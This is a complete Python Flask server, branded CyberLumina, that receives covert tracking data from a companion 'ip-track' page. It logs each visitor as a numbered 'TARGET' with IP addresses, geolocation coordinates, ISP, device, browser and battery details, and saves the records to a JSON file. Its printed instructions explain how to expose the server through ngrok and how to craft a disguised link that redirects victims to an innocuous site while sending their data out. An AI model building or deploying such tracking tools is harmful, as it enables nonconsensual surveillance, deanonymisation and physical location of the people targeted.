#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║          CyberLumina — Python IP Tracker Receiver               ║
║  Receives data from ip-track.html via HTTP POST (webhook)       ║
║                                                                  ║
║  Usage:                                                          ║
║    1. Install:  pip install flask flask-cors                     ║
║    2. Run:      python receiver.py                               ║
║    3. Optional public URL: use ngrok → ngrok http 5000           ║
║       Then use that ngrok URL as &hook= param in your link      ║
╚══════════════════════════════════════════════════════════════════╝
"""

import json
import os
import sys
import datetime

# ── Try to import Flask ──────────────────────────────────────────
try:
    from flask import Flask, request, jsonify
    from flask_cors import CORS
except ImportError:
    print("\n❌  Flask not installed. Run:")
    print("    pip install flask flask-cors\n")
    sys.exit(1)

app = Flask(__name__)
CORS(app)  # Allow cross-origin (required for browser→server fetch)

# ── Storage ──────────────────────────────────────────────────────
LOG_FILE = "captured_data.json"
captures = []

# ── Colors for terminal output ───────────────────────────────────
C = {
    "CYAN":   "\033[96m",
    "GREEN":  "\033[92m",
    "YELLOW": "\033[93m",
    "RED":    "\033[91m",
    "BOLD":   "\033[1m",
    "RESET":  "\033[0m",
    "DIM":    "\033[2m",
}

def color(text, *codes):
    return "".join(C.get(c,"") for c in codes) + str(text) + C["RESET"]

def banner():
    os.system("cls" if os.name == "nt" else "clear")
    print(color("╔══════════════════════════════════════════════════════════╗", "CYAN"))
    print(color("║     CyberLumina — IP Tracker Receiver  🕵️              ║", "CYAN", "BOLD"))
    print(color("╚══════════════════════════════════════════════════════════╝", "CYAN"))
    print()

def fmt(label, value, indent=4):
    pad = " " * indent
    lbl = color(label + ":", "CYAN")
    val = color(value or "—", "YELLOW") if value else color("—", "DIM")
    print(f"{pad}{lbl} {val}")

def print_capture(data, index):
    ts = data.get("timestamp", datetime.datetime.now().isoformat())
    print()
    print(color("━"*60, "CYAN"))
    print(color(f"  🎯 TARGET #{index}  ·  {ts}", "GREEN", "BOLD"))
    print(color("━"*60, "CYAN"))

    print(color("\n  ── 🌐 IP ADDRESSES ────────────────────────────────", "CYAN"))
    fmt("IPv4 (Public)",   data.get("ipv4"))
    fmt("IPv6",            data.get("ipv6") or "Not available")
    fmt("Private / Local", data.get("private_ip") or "Not detected")
    fmt("IP Type",         data.get("ip_type"))
    fmt("ISP / Org",       data.get("org"))
    fmt("ASN",             data.get("asn"))
    fmt("Connection",      data.get("connection"))

    print(color("\n  ── 📍 LOCATION ─────────────────────────────────────", "CYAN"))
    fmt("Country",         data.get("country"))
    fmt("City",            data.get("city"))
    fmt("Region",          data.get("region"))
    fmt("Postal Code",     data.get("postal"))
    fmt("Timezone",        data.get("timezone"))
    if data.get("lat") and data.get("lon"):
        fmt("Coordinates",  f"{data['lat']}, {data['lon']}")

    print(color("\n  ── 💻 DEVICE & BROWSER ─────────────────────────────", "CYAN"))
    fmt("Device Type",     data.get("device"))
    fmt("OS",              data.get("os"))
    fmt("Browser",         data.get("browser"))
    fmt("Screen",          data.get("screen"))
    fmt("Viewport",        data.get("viewport"))
    fmt("Language",        data.get("language"))
    fmt("Languages",       data.get("languages"))
    fmt("Platform",        data.get("platform"))
    fmt("CPU Cores",       str(data["cores"]) + " cores" if data.get("cores") else None)
    fmt("Device Memory",   data.get("memory"))
    fmt("Touch Support",   data.get("touch"))

    print(color("\n  ── 🔋 EXTRAS ────────────────────────────────────────", "CYAN"))
    bat_level   = data.get("battery_level")
    bat_charge  = data.get("battery_charging")
    if bat_level is not None:
        status = "Charging ⚡" if bat_charge else "Not Charging 🔋"
        fmt("Battery",     f"{bat_level} — {status}")
    else:
        fmt("Battery",     "Not available")
    fmt("Cookies",         data.get("cookies"))
    fmt("Do Not Track",    data.get("dnt"))
    fmt("WebGL Support",   "Yes" if data.get("webgl") else "No")
    fmt("Referrer",        data.get("referrer") or "Direct / None")

    print(color("\n  ── 🔎 USER AGENT ────────────────────────────────────", "CYAN"))
    ua = data.get("ua", "—")
    # wrap long UA
    for i in range(0, len(ua), 90):
        print("    " + color(ua[i:i+90], "DIM"))

    print()


# ── Flask Routes ─────────────────────────────────────────────────

@app.route("/", methods=["GET"])
def index():
    return f"""
    <html><body style="font-family:monospace;background:#0a1a24;color:#00f0ff;padding:2rem">
    <h2>🕵️ CyberLumina IP Receiver</h2>
    <p>Server is running. Waiting for targets...</p>
    <p>Captures so far: <b>{len(captures)}</b></p>
    <p>Endpoint: <code>POST /track</code></p>
    <p>To use with tracker: add <code>&amp;hook=YOUR_URL/track</code> to your ip-track link</p>
    </body></html>
    """

@app.route("/track", methods=["POST", "OPTIONS"])
def track():
    if request.method == "OPTIONS":
        # Preflight
        return "", 204

    try:
        data = request.get_json(force=True, silent=True) or {}
        if data.get("type") == "ip_track":
            captures.append(data)

            # Print to terminal
            print_capture(data, len(captures))

            # Save to JSON file
            with open(LOG_FILE, "w", encoding="utf-8") as f:
                json.dump(captures, f, indent=2, ensure_ascii=False)

            print(color(f"  💾 Saved to {LOG_FILE}", "GREEN"))
            return jsonify({"ok": True}), 200

    except Exception as e:
        print(color(f"  ❌ Error: {e}", "RED"))

    return jsonify({"ok": False}), 400


@app.route("/captures", methods=["GET"])
def get_captures():
    """JSON API — view all captured data"""
    return jsonify(captures)


@app.route("/clear", methods=["POST"])
def clear_captures():
    """Clear all captures"""
    captures.clear()
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)
    return jsonify({"ok": True, "message": "Cleared"})


# ── Run ──────────────────────────────────────────────────────────
if __name__ == "__main__":
    banner()

    port = int(os.environ.get("PORT", 5000))

    print(color("  Server starting...", "YELLOW"))
    print(color(f"  Local URL:  http://localhost:{port}", "GREEN"))
    print(color(f"  Endpoint:   http://localhost:{port}/track", "GREEN"))
    print()
    print(color("  For public URL (to receive from internet targets):", "YELLOW"))
    print(color("    1. Install ngrok:  https://ngrok.com", "DIM"))
    print(color("    2. Run:            ngrok http " + str(port), "DIM"))
    print(color("    3. Use ngrok URL as &hook= param in your link", "DIM"))
    print()
    print(color("  Example link:", "YELLOW"))
    print(color("    https://cyberlumina.kesug.com/ip-track.html?host=PEER_ID&redirect=https://ncs.io&hook=https://XXXX.ngrok.io/track", "DIM"))
    print()
    print(color("  Waiting for targets... (Ctrl+C to stop)", "CYAN", "BOLD"))
    print(color("─"*60, "DIM"))

    app.run(host="0.0.0.0", port=port, debug=False)
